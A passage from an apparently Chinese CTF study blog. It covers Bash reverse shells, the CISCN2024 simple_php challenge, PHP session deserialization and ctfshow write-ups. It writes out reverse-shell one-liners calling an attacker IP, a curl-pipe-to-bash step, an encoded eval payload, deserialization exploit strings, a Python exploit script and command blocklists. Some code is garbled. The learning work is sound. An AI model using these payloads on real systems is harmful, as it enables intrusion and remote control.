<p>second line</p>
<p>#&lt;&lt; 这个连续两个小符号， 他代表的是[结束的输入字符]的意思。这样当空行输入end字符时，自动退出输入，不需要使用ctrl+d或者ctrl+c退出</p>
</blockquote>
<p>先简单了解下这两个</p>
<p>回到Bash反弹shell</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.<span class="number">72/2333</span> <span class="number">0</span>&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>或</p>
<p>bash -c “bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 0&gt;&amp;1”    #更稳定</p>
<p>#bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击机IP&#x2F;攻击机端口 0&gt;&amp;1</p>
<p>&amp;[n] 代表是已经存在的文件描述符，&amp;1 代表输出 &amp;2代表错误输出&amp;-代表关闭与它绑定的描述符</p>
<p>所以这段指令就是在目标及和主机之间进行一个bash的shell交互环境，在主机上从键盘输出到0（也就是输出到目标机上比如我们执行指令），目标机进行输出（收到主机的指令，进行输出到主机上面）从而形成回路</p>
<p>然后攻击机在本地监听就可以了</p>
<p>nc -lvvn 2333</p>
<p>Curl配合Bash反弹shell首先，在攻击者vps的web目录里面<strong>创建一个index文件</strong>（index.php或index.html），内容如下</p>
<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 0&gt;&amp;1</p>
<p>#使用 bash -i 命令启动一个交互式的 Bash shell。然后将 shell 的标准输入、标准输出和标准错误重定向到 TCP 连接上,连接到 IP 地址 47.xxx.xxx.72 的 2333 端口</p>
<p>并开启2333端口的监听然后再目标机上执行如下，即可反弹shell：</p>
<p>curl 47.xxx.xxx.72|bash</p>
<p>#使用curl指令从 IP 地址 47.xxx.xxx.72 下载一个文件或脚本。然后将下载的内容通过管道符 | 传递给 bash 命令,也就是执行这个下载的脚本。</p>
<p><code>curl IP|bash</code> 中的IP可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。</p>
<p>基本了解了bash的反弹shell之后我们找题目</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strCheck</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;   <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|\&amp;|\\$|\x09|\x26|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i&quot;</span>, <span class="variable">$cmd</span>))&#123;  <span class="keyword">return</span>(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">  &#125;  <span class="keyword">else</span>&#123;     <span class="keyword">die</span>(<span class="string">&quot;i hate this&quot;</span>);       &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">strCheck</span>(<span class="variable">$cmd</span>);   <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">  <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>这个题目的关键函数</p>
<p><strong>strCheck()函数</strong>是用来检查输入的命令是否包含一些危险的关键字,比如;、&amp;、$等。如果包含这些关键字,函数会直接退出并输出”i hate this”。</p>
<p>cmd进行传参传给strCheck()</p>
<p><strong>如果strCheck()函数没有拦截该命令,代码会使用</strong></p>
<p><strong>shell_exec()函数执行该命令</strong></p>
<p>shell_exec()是PHP中用于执行系统命令的一个函数。它的作用是执行一个外部程序或命令,并将该命令的输出以字符串的形式返回。</p>
<p>用了shell_exec函数执行命令，但是不能回显，这里可以用重定向将命令写入到指定的文件</p>
<p>利用重定向执行ls &#x2F; 输出到1.txt</p>
<p>进入1.txt</p>
<p>执行同样操作</p>
<p>看到flag，下面将flag进行输出</p>
<p>再次访问1.txt得到flag</p>
<h2 id="CISCN2024-simple-php"><a href="#CISCN2024-simple-php" class="headerlink" title="CISCN2024 simple_php"></a><strong>CISCN2024 simple_php</strong></h2><p>今年国赛的一道题目</p>
<p>属实让我一脸懵逼        </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$cmd</span> = escapeshellcmd<span class="variable">$$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>,<span class="variable">$cmd</span>)) </span><br><span class="line"></span><br><span class="line">&#123;     </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>)</span><br><span class="line"></span><br><span class="line">;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>很多函数我都没见过，还过滤这么多东西</p>
<p>坐牢一下午</p>
<p>函数就不进行解释了</p>
<p>发现可以通过换行符进行了绕过</p>
<p>看了一些wp，这些人是这么想到的？他们竟然能用rce来做这题</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=php -r eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686f77207461626c65733b73656c656374202a2066726f6d20463161675f5365335265373b27603b,1)));</span><br></pre></td></tr></table></figure>

<p>php -r这真让人难以想到</p>
<p>找到flag就可以了</p>
<p>文章：<a href="https://xia0ji233.pro/2024/05/19/CISCN2024/index.html">https://xia0ji233.pro/2024/05/19/CISCN2024/index.html</a></p>
<p>还有一种就是反弹shell了</p>
<p>以为可以%0a换行符号绕过</p>
<p>在复现之前我得先搭建个服务器给自己</p>
<p>所以这几天我看能不能搭建自己的服务器</p>
<h1 id="PHP的session反序列化漏洞"><a href="#PHP的session反序列化漏洞" class="headerlink" title="PHP的session反序列化漏洞"></a><strong>PHP的session反序列化漏洞</strong></h1><p>反序列化还是有一点点的基础，现在的想法就是边做题边看wp边学习做笔记，先学广在慢慢学精</p>
<p>SESSION先了解下</p>
<p><strong>PHP Session 概述</strong></p>
<p>session 是一种客户与网站（服务器）更为安全的对话方式。一旦开启了 session 会话，便可以在网站的任何页面使用（保持）这个会话，从而让访问者与网站之间建立了一种“对话”机制。</p>
<p>这是官方的解释</p>
<p>session 会话会为每一个开启了 session 会话的访问者建立一个唯一的会话 ID ，用于识别用户。该会话 ID 可能存储于用户电脑的 cookie 内，也可能通过 URL 来传递。而对应的具体 session 值会存储于服务器端，这也是与 cookie 的主要区别，并且安全性相对较高。</p>
<p>回到session的反序列化</p>
<p>在php.ini中存在三项配置项：</p>
<ul>
<li><code>session.save_path=&quot;&quot;</code>  –设置session的存储路径</li>
<li><code>session.save_handler=&quot;&quot;</code>–设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</li>
<li><code>session.auto_start  boolen</code> –指定会话模块是否在请求开始时启动一个会话,默认为0不启动</li>
<li><code>session.serialize_handler  string</code>–定义用来序列化&#x2F;反序列化的处理器名字。默认使用php</li>
</ul>
<p>以上的选项就是与PHP中的Session存储和序列话存储有关的选项。</p>
<p>举例：</p>
<ul>
<li><code>session.save_path=&quot;D:\xampp\tmp&quot;</code> 表明所有的session文件都是存储在xampp&#x2F;tmp下</li>
<li><code>session.save_handler=files</code>   表明session是以文件的方式来进行存储的</li>
<li><code>session.auto_start=0</code>  表明默认不启动session</li>
<li><code>session.serialize_handler=php</code>   表明session的默认序列话引擎使用的是php序列话引擎</li>
</ul>
<ol>
<li><strong>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</strong></li>
<li><strong>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</strong></li>
<li><strong>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</strong></li>
</ol>
<p><strong>存储机制</strong></p>
<p>php中的session中的内<strong>容并不是放在内存</strong>中**的，而是以*文件******的方式来存储的，存储方式就是由配置项<code>session.save_handler</code>来进行确定的，默认是以文件的方式存储。</p>
<p>存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容。</p>
<p>假设我们的环境是xampp，那么默认配置如上所述。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>()</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;spoock&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">在php_serialzie引擎下</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>()</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;spoock&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>SESSION文件的内容是<code>a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;spoock&quot;;&#125;</code> 。a:1是使用php_serialize进行序列话都会加上。同时使用php_serialize会将session中的key和value都会进行序列化。</p>
<p><strong>在php_binary引擎下：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;spoock&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>SESSION文件的内容是<code>names:6:&quot;spoock&quot;;</code> 。由于name的长度是4，4在ASCII表中对应的就是EOT。根据php_binary的存储规则，最后就是<code>names:6:&quot;spoock&quot;;</code>。(突然发现ASCII的值为4的字符无法在网页上面显示，这个大家自行去查ASCII表吧)</p>
<p><strong>序列化简单利用</strong></p>
<?php

class syclover{

 var $func=""; function __construct() {  $this->func = "phpinfo()";

 }

 function __wakeup(){

  eval($this->func);

 }

}

unserialize($_GET['a']);

?>

<p>在11行对传入的参数进行了序列化。我们可以通过传入一个特定的字符串，反序列化为syclover的一个示例，那么就可以执行<code>eval()</code>方法。我们访问<code>localhost/test.php?a=O:8:&quot;syclover&quot;:1:&#123;s:4:&quot;func&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</code>。</p>
<p>得到的反序列化内容是</p>
<p>object(syclover)[1]</p>
<p> public ‘func’ &#x3D;&gt; string ‘echo “spoock”;’ (length&#x3D;14)</p>
<p><strong>PHP Session中的序列化危害</strong></p>
<p>PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。</p>
<p>如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如:</p>
<p>$_SESSION<code>[</code>‘ryat’<code>] = </code>‘|O:11:”PeopleClass”:0:{}’&#96;&#96;;</p>
<p>上述的$_SESSION的数据使用php_serialize，那么最后的存储的内容就是<code>a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;|O:11:&quot;PeopleClass&quot;:0:&#123;&#125;&quot;;&#125;</code>。</p>
<p>但是我们在进行读取的时候，选择的是php，那么最后读取的内容是:</p>
<p>array<code> </code>(size&#x3D;1)<code> </code>‘a:1:{s:6:”spoock”;s:24:”‘<code> </code>&#x3D;&gt; <code> </code>object(__PHP_Incomplete_Class)[1]<code> </code>public<code> </code>‘__PHP_Incomplete_Class_Name’<code> </code>&#x3D;&gt; string &#96;&#96;’PeopleClass’<code> </code>(length&#x3D;11)</p>
<p>这是因为当使用php引擎的时候，<strong>php引擎会以|作为作为key和value的分隔符</strong>，那么就会将<code>a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;</code>作为SESSION的key，将<code>O:11:&quot;PeopleClass&quot;:0:&#123;&#125;</code>作为value，然后进行反序列化，最后就会得到PeopleClas这个类。 这种由于序列话化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。</p>
<p><strong>实际利用</strong></p>
<p>存在s1.php和us2.php，2个文件所使用的SESSION的引擎（session.serialize_handler）不一样，就形成了一个漏洞、</p>
<p>s1.php，使用php_serialize来处理session</p>
<?php ini_set`(`'session.serialize_handler','php_serialize'`);`session_start();

$$_SESSION``[``"spoock"``]=`$$_GET`[`"a"``];

**us2.php,使用php来处理session**

ini_set`(`'session.serialize_handler'`,'php'`);

session_start();

class` `lemon {

​    var` `$hi``;`     function` `__construct(){      $this`->hi = `'phpinfo();';`           }``          function` `__destruct() {         `eval`(`$this`->hi);         ` ``}`       `}

**当访问s1.php时，提交如下的数据：**

localhost/s1.php?a=|O:5:`"lemon"`:1:{s:2:`"hi"`;s:14:`"echo "`spoock`";"`;}

此时传入的数据会按照php_serialize来进行序列化。

此时访问us2.php时，页面输出，spoock成功执行了我们构造的函数。因为在访问us2.php时，程序会按照php来反序列化SESSION中的数据，此时就会反序列化伪造的数据，就会实例化lemon对象，最后就会执行析构函数中的`eval()`方法。

例题

# **CTFSHOW 新生杯**

### **剪刀石头布**

考查[session](https://so.csdn.net/so/search?q=session&spm=1001.2101.3001.7020)反序列化漏洞。 不同的session处理器会导致[反序列化](https://so.csdn.net/so/search?q=反序列化&spm=1001.2101.3001.7020)漏洞

exp：

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://697e59f6-2b82-43b9-806d-25fa3965a86b.challenge.ctf.show/&quot;</span><br><span class="line">sess=&quot;yu22x&quot;</span><br><span class="line">data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;|O:4:&quot;Game&quot;:1:&#123;s:3:&quot;log&quot;;s:22:&quot;/var/www/html/flag.php&quot;;&#125;&#x27;&#125;</span><br><span class="line">files=&#123;&#x27;file&#x27;:&#x27;1&#x27;&#125;</span><br><span class="line">r = requests.post(url,data=data,files=files,cookies=&#123;&#x27;PHPSESSID&#x27;:&#x27;yu22x&#x27;&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

# **安恒杯一道题**

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_string</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo1</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;  <span class="variable language_">$this</span>-&gt;varr = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;varr))&#123;   <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;文件&quot;</span>.<span class="variable language_">$this</span>-&gt;varr.<span class="string">&quot;存在&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;这是foo1的析构函数&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo2</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">$this</span>-&gt;varr = <span class="string">&#x27;1234567890&#x27;</span>;  <span class="variable language_">$this</span>-&gt;obj = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">execute</span>();  <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;varr;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;这是foo2的析构函数&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo3</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span>&#123;  <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;varr);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;这是foo3的析构函数&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

index.php

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;./class.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">foo1</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span>-&gt;varr = <span class="string">&quot;phpinfo.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">分析可以知道最后肯定是要用execue里的<span class="keyword">eval</span>的</span><br><span class="line"></span><br><span class="line">在本地搭建环境，构造我们需要执行的自定义函数</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo3</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>=<span class="string">&#x27;echo &quot;spoock&quot;;&#x27;</span>; <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span>&#123;  <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;varr);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo2</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">$this</span>-&gt;varr = <span class="string">&#x27;1234567890&#x27;</span>;  <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title function_ invoke__">foo3</span>();</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">execute</span>();  <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;varr;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo1</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;  <span class="variable language_">$this</span>-&gt;varr = <span class="keyword">new</span> <span class="title function_ invoke__">foo2</span>();</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">foo1</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

在foo1中的构造函数中定义$varr的值为foo2的实例，在foo2中定义$obj为foo3的实例，在foo3中定义$varr的值为echo "spoock"。最终得到的序列话的值是

$$O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:10:"1234567890";s:3:"obj";O:4:"foo3":1:{s:4:"varr";s:14:"echo "spoock";";}}}$$

]]></content>
      <tags>
        <tag>CISCN</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow摆烂杯复现</title>
    <url>/2024/07/28/ctfshow%E6%91%86%E7%83%82%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="一行代码"><a href="#一行代码" class="headerlink" title="一行代码"></a>一行代码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">\# -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Date</span>:  2021-11-18 21:25:22</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Last</span> Modified by:  h1xa</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Last</span> Modified time: 2021-11-18 22:14:12</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> !(!(<span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>)||(!<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>))||<span class="title function_ invoke__">stripos</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>],<span class="string">&#x27;.&#x27;</span>)||(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]!=<span class="number">0</span>)||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>])&lt;=<span class="number">7</span>)||(!<span class="title function_ invoke__">eregi</span>(<span class="string">&quot;ctfsho&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>],<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;ctfshow&quot;</span>))||<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>],<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&#x27;w&#x27;</span>||(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>],<span class="string">&#x27;r&#x27;</span>) !== <span class="string">&quot;welcome2ctfshow&quot;</span>))?<span class="variable">$flag</span>:<span class="title function_ invoke__">str_repeat</span>(<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>), <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>分析下源码</p>
<ol>
<li>成功包含 <code>flag.php</code> 文件。</li>
<li>错误报告已关闭。</li>
<li><code>$_GET[&#39;filename&#39;]</code> 中不包含 <code>.</code>。</li>
<li><code>$_GET[&#39;id&#39;]</code> 等于 <code>0</code>。</li>
<li><code>$_GET[&#39;content&#39;]</code> 的长度大于7。</li>
<li><code>$_GET[&#39;content&#39;]</code> 的第一个字符与 <code>ctfshow</code> 匹配。</li>
<li><code>$_GET[&#39;content&#39;]</code> 的第一个字符不为 <code>w</code>。</li>
<li><code>$_GET[&#39;filename</code> 的内容为 <code>welcome2ctfshow</code>。</li>
</ol>
<p>如果所有这些条件都满足，则输出 <code>$flag</code></p>
<p>id&#x3D;0没什么讲的 cotent内容大于7.且第一个字母不为w,但又要与welcome 第一个字符一样</p>
<p>搜索下eregi(string,string)</p>
<p>发现作用就是用来进行字符串匹配的，但是他不区分大小写，所以这里我们直接第一个字母大写W就好了</p>
<p>filename 要为welcome2ctfshow 但不能直接俄get传 因为这样会把整个文件读入</p>
<p>所有用伪协议php:&#x2F;&#x2F;input</p>
<p>让后POST提交welcome2ctfshow</p>
<p>GET: ?id&#x3D;0&amp;content&#x3D;W2Gu0f3n&amp;filename&#x3D;php:&#x2F;&#x2F;input</p>
<p>POST:welcome2ctfshow</p>
<p><img src="/imgs/2024%E5%B9%B47%E6%9C%8828%E6%97%A510%E7%82%B924%E5%88%86.png" alt="image-20240728102150005"></p>
<h2 id="黑客网站"><a href="#黑客网站" class="headerlink" title="黑客网站"></a>黑客网站</h2><p>打开其实就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tyro s4qw s3mm bubg jqje 46nc v35j aqjg eb3n qiuf 23ij oj4z wasx ohyd onion</span><br></pre></td></tr></table></figure>

<p>循环 看到 onion 应该都不陌生</p>
<p>下载洋葱浏览器直接搜就是了，但是洋葱都知道是干嘛的吧（(●’◡’●)）</p>
<h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><p>计算方式为(A)**3+(B)**3+(c)**3</p>
<p>用括号绕过即可，</p>
<p>a&#x3D;+114)+(0</p>
<p>b和c都为-0就可以</p>
<p>(+114)+(0)**3+(-0)**3+(-0)**3 &#x3D;114</p>
<h2 id="登陆不了"><a href="#登陆不了" class="headerlink" title="登陆不了"></a>登陆不了</h2><p>注册发现验证码没用到</p>
<p>打开验证码图片位置</p>
<p>确定存在任意文件读取漏洞</p>
<p>ok，不会了 gg 提桶跑路 ヾ(•ω•&#96;)o</p>
<p>哈哈哈 还是得好好复现（之后补上嘿嘿）</p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow原谅杯</title>
    <url>/2024/07/19/ctfshow%E5%8E%9F%E8%B0%85%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
